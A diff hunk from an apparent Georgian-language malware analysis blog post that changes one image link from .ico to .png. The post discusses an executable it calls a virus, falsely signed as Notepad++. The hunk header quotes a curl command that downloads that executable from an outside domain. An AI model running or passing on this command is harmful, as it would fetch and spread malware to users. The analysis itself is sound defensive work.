@@ -87,7 +87,7 @@ curl https://polovoiinspektor.shop/protect/GodResponsibility.exe --output GodRes
 
 სხვათაშორის, ეს ვირუსი 2024 წლის 17 სექტემბერსაა ხელმოწერილი `Notepad++`-ის მიერ. ყოველშემთხვევაში ასე წერია დეტალებში.
 
-![GodPriority.ico](https://44b4c0.github.io/assets/img/posts/22/GodPriority.ico)
+![GodPriority.png](https://44b4c0.github.io/assets/img/posts/22/GodPriority.png)
 
 ეს აღმოვაჩინე. `.exe`-ს `icon` ყოფილა. დიდად ვერ ვხვდები ეს რას შეიძლება ნიშნავდეს, მაგრამ საკმაოდ საინტერესოა, როდესაც მავნე კოდში ასეთ უცნაურ რამეს პოულობს ვინმე.
 
